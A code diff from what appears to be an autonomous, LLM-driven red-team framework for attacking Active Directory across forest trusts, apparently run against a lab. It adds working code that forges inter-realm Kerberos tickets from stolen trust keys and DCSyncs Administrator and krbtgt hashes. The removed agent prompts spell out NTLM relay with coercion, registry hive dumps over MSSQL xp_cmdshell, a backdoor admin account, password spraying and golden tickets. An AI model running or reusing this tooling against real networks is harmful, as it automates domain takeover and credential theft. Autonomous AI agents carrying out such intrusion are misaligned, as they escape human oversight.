@@ -2500,9 +2500,9 @@ async def _auto_credential_access(
                             f"Auto credential access (low-hanging fruit, no-creds) dispatched for domain {domain}"
                         )
 
-            # Dispatch no-creds recon for newly-discovered foreign domains
-            # (Even though we have creds for the primary domain, foreign domains
-            # need their own AS-REP/password spray/user enum pass)
+            # Dispatch cross-forest credential_access for foreign domains
+            # Only dispatched when we have a usable cross-forest credential
+            # to avoid the LLM fabricating passwords.
             if state.all_credentials or state.all_hashes:
                 foreign_domains = state.get_undominated_forests() if get_multi_forest_mode() else []
                 if foreign_domains:
@@ -2569,6 +2569,14 @@ async def _auto_credential_access(
                         ),
                         None,
                     )
+                    if not cross_cred:
+                        # Don't dispatch credential_access to foreign domains without
+                        # a real credential — the LLM will fabricate passwords.
+                        # Wait until we have a usable cross-forest credential.
+                        logger.debug(
+                            f"🌲 Skipping foreign domain {fd}: no cross-forest credential available yet"
+                        )
+                        continue
                     fd_payload: dict[str, object] = {
                         "domain": fd,
                         "target_ips": fd_hosts,
@@ -2578,22 +2586,19 @@ async def _auto_credential_access(
                             "password_spray",
                             "asrep_roast",
                         ],
+                        "username": cross_cred.username,
+                        "password": cross_cred.password,
+                        "credential_domain": cross_cred.domain,
+                        "note": (
+                            f"Cross-forest credential: {cross_cred.username}@{cross_cred.domain} "
+                            f"(not from {fd})."
+                        ),
                     }
-                    if cross_cred:
-                        fd_payload["username"] = cross_cred.username
-                        fd_payload["password"] = cross_cred.password
-                        fd_payload["credential_domain"] = cross_cred.domain
-                        fd_payload["note"] = (
-                            f"CROSS-FOREST: credential {cross_cred.username} is from "
-                            f"{cross_cred.domain}, NOT from {fd}. You MUST pass "
-                            f"credential_domain='{cross_cred.domain}' to asrep_roast() "
-                            f"and kerberoast() for cross-domain enumeration via trust."
-                        )
-                        logger.info(
-                            f"🌲 Including cross-forest credential "
-                            f"{cross_cred.username}@{cross_cred.domain} "
-                            f"for foreign domain {fd} enumeration"
-                        )
+                    logger.info(
+                        f"🌲 Including cross-forest credential "
+                        f"{cross_cred.username}@{cross_cred.domain} "
+                        f"for foreign domain {fd} enumeration"
+                    )
                     if dispatcher._task_queue:
                         fruit_task_id = await dispatcher._task_queue.submit_task(
                             task_type="credential_access",
@@ -3094,10 +3099,8 @@ async def _auto_coercion(
                         "coerce_target": target_dc.ip,
                         "coerce_hostname": target_dc.hostname,
                         "note": (
-                            f"ESC8 RELAY ATTACK: Start ntlmrelayx targeting "
-                            f"http://{server_hostname or server_ip}/certsrv/ with template "
-                            f"DomainController, then coerce {target_dc.hostname or target_dc.ip} "
-                            f"with petitpotam to get DC certificate for domain admin."
+                            f"ESC8 relay: {server_hostname or server_ip}/certsrv/, "
+                            f"coerce target: {target_dc.hostname or target_dc.ip}."
                         ),
                     },
                 )
@@ -3130,9 +3133,8 @@ async def _auto_coercion(
                         "coerce_hostname": host.hostname,
                         "relay_target": host.ip,  # Relay to same DC's LDAPS
                         "note": (
-                            f"LDAPS RELAY: Start ntlmrelayx targeting ldaps://{host.ip} with "
-                            f"--delegate-access, then coerce {host.hostname or host.ip} with "
-                            f"petitpotam to create machine account for RBCD attack."
+                            f"LDAPS relay: ldaps://{host.ip}, "
+                            f"coerce target: {host.hostname or host.ip}."
                         ),
                     },
                 )
@@ -3755,6 +3757,9 @@ async def _auto_golden_ticket(
                             ip = dc_ip if isinstance(dc_ip, str) else dc_ip.decode()
                             if d.lower() not in state.domain_controllers:
                                 state.domain_controllers[d.lower()] = ip
+                    # Sync hosts and domains from Redis (picks up CLI inject-host data)
+                    # This is critical for _get_foreign_domains to validate essos.local etc.
+                    await state.sync_hosts_and_domains_from_redis()
                 except Exception as sync_err:
                     logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")
 
@@ -5856,6 +5861,246 @@ async def _auto_foreign_dcsync(
                             return
                         break
 
+                # ── Phase 3: Inter-realm ticket forging via trust key ──
+                import shlex
+
+                # If we have a trust key hash (e.g. ESSOS$) for this foreign domain,
+                # forge an inter-realm TGT and DCSync the foreign DC deterministically.
+                # This bypasses the LLM agent entirely (which fails because
+                # extract_trust_key doesn't support PTH and the task times out).
+                target_nb = fd_lower.split(".")[0].upper()
+                trust_account = f"{target_nb}$"
+
+                # Find the trust key hash — stored under the SOURCE domain (e.g.
+                # sevenkingdoms.local\ESSOS$), not the foreign domain itself.
+                trust_hash = None
+                for h in state.all_hashes:
+                    if (
+                        h.username.upper() == trust_account
+                        and (h.hash_type or "").upper() == "NTLM"
+                        and h.hash_value
+                    ):
+                        # hash_value may be "lm:nt" (65 chars) or just "nt" (32 chars)
+                        nt_part = (
+                            h.hash_value.split(":")[-1] if ":" in h.hash_value else h.hash_value
+                        )
+                        if len(nt_part) == 32:
+                            trust_hash = h
+                            break
+
+                if not trust_hash:
+                    continue
+
+                dedup_key_ir = f"{fd_lower}:{dc_ip}:inter_realm_ticket"
+                if dedup_key_ir in state.processed_foreign_dcsync:
+                    continue
+
+                # Need source domain SID for ticketer
+                source_domain = (trust_hash.domain or "").lower()
+                source_sid = state.domain_sids.get(source_domain, "")
+                target_sid = state.domain_sids.get(fd_lower, "")
+
+                if not source_sid:
+                    logger.info(
+                        f"🌲 Auto-foreign-dcsync: no source SID for {source_domain}, "
+                        f"skipping inter-realm ticket for {foreign_domain}"
+                    )
+                    continue
+
+                # Resolve DCs
+                source_dc = state.domain_controllers.get(source_domain, "")
+                if not source_dc:
+                    continue
+
+                logger.info(
+                    f"🌲 Auto-foreign-dcsync: forging inter-realm ticket for {foreign_domain}\n"
+                    f"   Trust key: {trust_account} from {source_domain}\n"
+                    f"   Source DC: {source_dc}, Target DC: {dc_ip}\n"
+                    f"   Source SID: {source_sid}, Target SID: {target_sid or '(unknown)'}\n"
+                    f"   AES key: {'yes' if trust_hash.aes_key else 'no'}"
+                )
+
+                # Build ticketer command
+                if trust_hash.aes_key:
+                    key_args = f"-aesKey {trust_hash.aes_key}"
+                else:
+                    # Extract NT hash from potential "lm:nt" format
+                    nt_hash = (
+                        trust_hash.hash_value.split(":")[-1]
+                        if ":" in trust_hash.hash_value
+                        else trust_hash.hash_value
+                    )
+                    key_args = f"-nthash {nt_hash}"
+
+                extra_sid_arg = ""
+                if target_sid:
+                    extra_sid_arg = f"-extra-sid {target_sid}-519"
+
+                ticketer_cmd = (
+                    f"impacket-ticketer {key_args} "
+                    f"-domain-sid {source_sid} "
+                    f"-domain {source_domain} "
+                    f"{extra_sid_arg} "
+                    f"-spn krbtgt/{fd_lower} "
+                    f"-duration 3650 Administrator"
+                )
+
+                # Build DCSync targets
+                dcsync_targets = [
+                    f"{target_nb}\\Administrator",
+                    f"{target_nb}\\krbtgt",
+                ]
+                targets_str = ",".join(dcsync_targets)
+
+                # Resolve foreign DC FQDN for secretsdump target string
+                foreign_fqdn = fd_lower
+                for host in state.all_hosts:
+                    if host.ip == dc_ip and host.hostname and "." in host.hostname:
+                        foreign_fqdn = host.hostname.lower()
+                        break
+
+                # Python script with referral routing patch (same pattern as Step 2)
+                dcsync_py = (
+                    "import os,sys,re,runpy,shutil\n"
+                    "from impacket.krb5 import kerberosv5\n"
+                    "_oSR=kerberosv5.sendReceive\n"
+                    f'SD="{source_domain.upper()}"\n'
+                    f'TD="{fd_lower.upper()}"\n'
+                    f'SDC="{source_dc}"\n'
+                    f'TDC="{dc_ip}"\n'
+                    f'TF="{foreign_fqdn}"\n'
+                    "DKM={SD:SDC,TD:TDC}\n"
+                    "def _pSR(d,dom,kdc=None):\n"
+                    "  m=DKM.get(dom.upper())\n"
+                    "  if m:\n"
+                    "    try:\n"
+                    "      return _oSR(d,dom,m)\n"
+                    "    except Exception as e1:\n"
+                    "      print(f'KDC {m} failed for {dom}: {e1}')\n"
+                    "      for a in set(DKM.values()):\n"
+                    "        if a!=m:\n"
+                    "          try:return _oSR(d,dom,a)\n"
+                    "          except:pass\n"
+                    "      raise\n"
+                    "  return _oSR(d,dom,kdc)\n"
+                    "kerberosv5.sendReceive=_pSR\n"
+                    "os.environ['KRB5CCNAME']='Administrator.ccache'\n"
+                    "w=shutil.which('impacket-secretsdump')\n"
+                    "sd=None\n"
+                    "if w:\n"
+                    "  with open(w) as f:\n"
+                    "    c=f.read()\n"
+                    '  m=re.search(r\'"([^"]*secretsdump\\.py)"\',c)\n'
+                    "  if m:sd=m.group(1)\n"
+                    "  elif c.startswith('#!/usr/bin/env python'):\n"
+                    "    sd=w\n"
+                    "if not sd:\n"
+                    "  sd='/opt/impacket/examples/secretsdump.py'\n"
+                    "print(f'using {sd}')\n"
+                    f'TARGETS="{targets_str}"\n'
+                    "for usr in TARGETS.split(','):\n"
+                    "  try:\n"
+                    "    sys.argv=['secretsdump','-k','-no-pass',"
+                    "'-just-dc-user',usr,'-just-dc-ntlm',"
+                    "'-target-ip',TDC,'-dc-ip',SDC,"
+                    "SD+'/Administrator@'+TF]\n"
+                    "    print(f'DCSync {usr} via {TF}')\n"
+                    "    runpy.run_path(sd,run_name='__main__')\n"
+                    "  except SystemExit:pass\n"
+                    "  except Exception as e:\n"
+                    "    print(f'DCSync {usr}: {e}')\n"
+                )
+                dcsync_cmd = f"python3 -c {shlex.quote(dcsync_py)}"
+
+                ir_bash = f"{ticketer_cmd} && {dcsync_cmd}"
+                ir_cmd = ["bash", "-c", ir_bash]
+
+                logger.info(
+                    f"🌲 Auto-foreign-dcsync: inter-realm DCSync "
+                    f"{foreign_domain} via {foreign_fqdn}"
+                )
+
+                ir_stdout, ir_stderr, ir_rc = await _async_run_tool(ir_cmd, timeout_seconds=600)
+                ir_output = (ir_stdout or "") + "\n" + (ir_stderr or "")
+
+                logger.info(
+                    f"🌲 Auto-foreign-dcsync: inter-realm result rc={ir_rc}, "
+                    f"output_len={len(ir_output)}, first_300={ir_output[:300]!r}"
+                )
+
+                state.processed_foreign_dcsync.add(dedup_key_ir)
+
+                # Parse results
+                ir_admin = re.search(
+                    r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                    ir_output,
+                )
+                ir_krbtgt = re.search(
+                    r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                    ir_output,
+                )
+                ir_krbtgt_aes = re.search(
+                    r"krbtgt:aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)",
+                    ir_output,
+                )
+
+                if ir_admin:
+                    logger.success(
+                        f"🌲 Auto-foreign-dcsync (inter-realm): "
+                        f"got Administrator hash for {foreign_domain}!"
+                    )
+                    state.add_hash(
+                        Hash(
+                            username="Administrator",
+                            domain=foreign_domain,
+                            hash_type="NTLM",
+                            hash_value=ir_admin.group(1),
+                            source=f"auto_foreign_dcsync:inter_realm:{trust_account}",
+                        ),
+                        "auto_foreign_dcsync",
+                    )
+                    state.has_domain_admin = True
+                    if fd_lower not in [d.lower() for d in state.domain_admin_domains]:
+                        state.domain_admin_domains.append(fd_lower)
+                        logger.success(
+                            f"🌲🏆 DOMAIN ADMIN on foreign forest "
+                            f"{foreign_domain} (via inter-realm ticket)!"
+                        )
+
+                if ir_krbtgt:
+                    aes_val = ir_krbtgt_aes.group(1) if ir_krbtgt_aes else ""
+                    state.add_hash(
+                        Hash(
+                            username="krbtgt",
+                            domain=foreign_domain,
+                            hash_type="NTLM",
+                            hash_value=ir_krbtgt.group(1),
+                            aes_key=aes_val,
+                            source=f"auto_foreign_dcsync:inter_realm:{trust_account}",
+                        ),
+                        "auto_foreign_dcsync",
+                    )
+
+                if ir_admin or ir_krbtgt:
+                    await dispatcher._checkpoint()
+                    if state.all_forests_dominated():
+                        logger.success("🌲🏆 ALL FORESTS DOMINATED via inter-realm ticket DCSync!")
+                        state.completed = True
+                        await dispatcher._checkpoint()
+                        return
+                # Inter-realm failed — log SPN validation hint
+                elif "SPN target name validation" in ir_output:
+                    logger.warning(
+                        f"🌲 Auto-foreign-dcsync: inter-realm DCSync blocked by "
+                        f"SPN target name validation on {foreign_domain} DC. "
+                        f"Falling back to FSP/MSSQL/ACL paths."
+                    )
+                else:
+                    logger.warning(
+                        f"🌲 Auto-foreign-dcsync: inter-realm DCSync failed for "
+                        f"{foreign_domain}, output: {ir_output[:500]!r}"
+                    )
+
         except asyncio.CancelledError:
             break
         except Exception as e:
@@ -6141,10 +6386,7 @@ async def _auto_cross_forest_pivot(
 
                     sysadmin_note = ""
                     if known_sysadmins:
-                        sysadmin_note = (
-                            f" KNOWN SYSADMIN/ADMIN USERS: {', '.join(known_sysadmins)} — "
-                            f"USE THESE FIRST, they connect as sysadmin without needing impersonation."
-                        )
+                        sysadmin_note = f" Known sysadmins: {', '.join(known_sysadmins)}."
 
                     # Queue as a high-priority exploit — the linked server is the path
                     pivot_details: dict[str, Any] = {
@@ -6153,30 +6395,9 @@ async def _auto_cross_forest_pivot(
                         "mssql_port": mssql_port,
                         "available_credentials": sql_creds,
                         "note": (
-                            f"CRITICAL CROSS-FOREST PIVOT: This MSSQL server in {host_domain} "
-                            f"likely has linked servers to {foreign_domain}.{port_note}{sysadmin_note} "
-                            f"Known foreign MSSQL hosts: {', '.join(foreign_targets) if foreign_targets else 'unknown — enumerate them'}. "
-                            f"MANDATORY ATTACK CHAIN (follow ALL steps in order): "
-                            f"1) Connect with each credential below (Windows auth, port={mssql_port}). "
-                            f"2) mssql_enum_impersonation — check EXECUTE AS rights to sa/other users. "
-                            f"3) MANDATORY: If impersonation found, you MUST call mssql_impersonate BEFORE "
-                            f"attempting linked server queries. Without impersonation, linked servers "
-                            f"will connect as ANONYMOUS LOGON and fail. "
-                            f"4) mssql_enum_linked_servers — find cross-forest linked servers. "
-                            f"5) mssql_linked_enable_xpcmdshell on the foreign linked server. "
-                            f"6) mssql_linked_xpcmdshell — execute 'whoami /all', 'ipconfig /all', "
-                            f"'net user /domain', 'net group \"Domain Admins\" /domain' on foreign host. "
-                            f"7) Use mssql_linked_xpcmdshell to dump credentials: "
-                            f"'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && "
-                            f"reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.save && "
-                            f"reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.save'. "
-                            f"8) Create a local admin for remote access: "
-                            f"'net user ares_admin P@ssw0rd123! /add && "
-                            f"net localgroup Administrators ares_admin /add'. "
-                            f"Then use secretsdump with ares_admin against this host to dump all creds. "
-                            f"DO NOT STOP after enumerating linked servers — you MUST get RCE and extract creds. "
-                            f"TRY ALL CREDENTIALS — one of them is sysadmin or can impersonate sa. "
-                            f"If Windows auth fails with 'untrusted domain', try windows_auth=False (SQL auth)."
+                            f"Cross-forest MSSQL pivot: {host_domain} → {foreign_domain}.{port_note}{sysadmin_note} "
+                            f"Known foreign MSSQL hosts: {', '.join(foreign_targets) if foreign_targets else 'unknown'}. "
+                            f"Check for linked servers and impersonation."
                         ),
                     }
 
@@ -6229,13 +6450,8 @@ async def _auto_cross_forest_pivot(
                         "mssql_port": fhost_mssql_port,
                         "available_credentials": sql_creds,
                         "note": (
-                            f"CROSS-FOREST MSSQL TARGET in {foreign_domain}.{fport_note} "
-                            f"Forest trust allows Windows auth from dominated domains. "
-                            f"Try ALL credentials below — some may authenticate via trust. "
-                            f"If Windows auth fails with 'untrusted domain', try windows_auth=False (SQL auth). "
-                            f"Check impersonation rights, linked servers back to dominated domain, "
-                            f"and enable xp_cmdshell for RCE. "
-                            f"Any command execution here = foothold in {foreign_domain}."
+                            f"Cross-forest MSSQL target in {foreign_domain}.{fport_note} "
+                            f"Check for impersonation and linked servers."
                         ),
                     }
 
@@ -6923,6 +7139,10 @@ async def _wait_for_completion(
 
             # Multi-forest mode: continue until ALL forests are dominated
             if get_multi_forest_mode() and not dispatcher.shared_state.all_forests_dominated():
+                # Not all forests dominated yet — reset grace timer so it starts fresh
+                # when all forests eventually appear dominated
+                if hasattr(_wait_for_completion, "_mf_grace_start"):
+                    del _wait_for_completion._mf_grace_start
                 # DA achieved but other forests remain - continue operation
                 # Periodically retry trust extraction dispatch as safety net
                 # (dedup in _auto_dispatch_trust_key_extraction prevents duplicates)
@@ -7015,76 +7235,18 @@ def _build_orchestrator_prompt(
     Returns:
         Formatted prompt string
     """
+    from ares.core.templates import get_template_loader
+
     cred_info = "None (start with unauthenticated recon)"
     if initial_credential:
         cred_info = f"{initial_credential.domain}\\{initial_credential.username}"
 
-    return f"""Begin red team operation for {target_domain}.
-
-Target IPs: {", ".join(target_ips)}
-Initial credential: {cred_info}
-
-Your objectives:
-1. Run nmap_scan on all targets to discover services (ONCE - do NOT re-scan targets that have already been scanned)
-2. **Run smb_sweep on all targets** - This captures Windows OS versions, FQDNs, and domain membership (CRITICAL for host identification)
-3. **MULTI-DOMAIN SETUP (run early with first credential!):**
-   - enumerate_domain_netbios_mappings: Query AD for NetBIOS->FQDN domain mappings
-   - This ensures credentials from child domains resolve correctly (e.g., CORP -> corp.contoso.local)
-4. LOW-HANGING FRUIT (do these early!):
-   - ldap_search_descriptions: Find passwords stored in user description fields
-   - password_spray with common passwords (Password1, Welcome1, Summer2024, Company123, Qwerty123, Passw0rd!, LetMeIn1)
-   - username_as_password: Test if users have username as password (e.g., user1:user1)
-5. Enumerate users and shares with netexec/enum4linux-ng/rpcclient/smbclient
-6. If no creds, run Kerberos user recon with kerberos_user_enum_noauth
-7. Run certipy_find to discover ADCS vulnerabilities
-8. Run run_bloodhound for ACL analysis and attack path discovery
-9. **CRITICAL CREDENTIAL EXPANSION (run IMMEDIATELY after finding ANY credentials):**
-   - Use secretsdump on ALL domain controllers to dump hashes
-   - Use kerberoast to find service accounts with weak passwords
-   - Use asrep_roast to find accounts without Kerberos pre-auth
-   - Check secretsdump output for krbtgt or Administrator hashes
-   - If krbtgt hash found → Generate golden ticket → Announce Domain Admin
-   - If Administrator hash found → Test DA access → Announce Domain Admin
-10. Coordinate with specialized agents to exploit discovered vulnerabilities
-11. Use trigger_credential_expansion after getting new credentials
-12. Continue until Domain Admin access achieved
-
-Priority vulnerabilities to look for:
-- Passwords in LDAP description fields (QUICK WIN - check first!)
-- Username=password combinations (QUICK WIN)
-- Weak/common passwords via spraying (QUICK WIN)
-- **krbtgt hash via secretsdump (HIGHEST PRIORITY - instant DA)**
-- **Administrator hash via secretsdump (VERY HIGH PRIORITY)**
-- ADCS ESC1-ESC8
-- Kerberoastable accounts
-- AS-REP roastable accounts
-- Unconstrained/Constrained delegation
-- ACL abuse paths (GenericAll, WriteDACL, etc.)
-- MSSQL linked servers
-
-CRITICAL WORKFLOW AFTER FINDING CREDENTIALS:
-1. Run secretsdump against all DCs immediately
-2. Run kerberoast and asrep_roast with the credentials
-3. Look for krbtgt or Administrator in secretsdump output
-4. Crack any discovered hashes with dispatch_crack_hash
-5. Test new credentials and repeat steps 1-4
-
-Remember:
-- Use dispatch_* tools to route tasks to specialized agents
-- Use queue_vulnerability_for_exploitation to queue discovered vulnerabilities
-- Use trigger_credential_expansion after finding new credentials
-- **ALWAYS run secretsdump after finding ANY credentials**
-- Monitor progress with get_operation_summary
-- Announce domain admin when achieved with announce_domain_admin
-
-IMPORTANT - Avoid polling loops:
-- Do NOT repeatedly call get_pending_tasks or get_exploitation_status without taking action
-- If tasks are pending, wait for results OR dispatch new tasks - don't just keep checking status
-- Only check status after taking an action or after significant time has passed
-- Each step should make progress (dispatch task, exploit vuln, expand creds) - not just observe
-
-Let's begin the operation!
-"""
+    return get_template_loader().render(
+        "redteam/agents/orchestrator_initial.md.jinja",
+        target_domain=target_domain,
+        target_ips=target_ips,
+        cred_info=cred_info,
+    )
 
 
 __all__ = [
